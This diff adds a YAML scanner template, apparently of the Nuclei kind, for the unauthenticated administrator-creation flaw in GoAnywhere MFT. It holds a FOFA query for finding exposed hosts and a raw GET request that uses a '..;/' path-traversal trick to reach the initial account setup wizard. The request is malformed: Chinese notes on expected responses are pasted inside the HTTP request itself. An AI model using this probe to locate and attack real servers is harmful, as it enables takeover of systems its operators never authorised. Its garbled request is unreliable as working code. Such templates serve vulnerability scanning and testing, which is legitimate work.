@@ -1,0 +1,34 @@
+id: poc-brgk66g2lg4atgdx
+info:
+  name: Goanywhere MFT 未授权创建管理员
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/brgk66g2lg4atgdx'
+  tags: unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: brgk66g2lg4atgdx
+    fofa: (body="InvalidBrowser.xhtml" || icon_hash="1484947000" || icon_hash="1828756398" || icon_hash="1170495932") && title=="GoAnywhere 7.1.2"
+http:
+- raw:
+  - 'GET /goanywhere/images/..;/wizard/InitialAccountSetup.xhtml HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    account
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
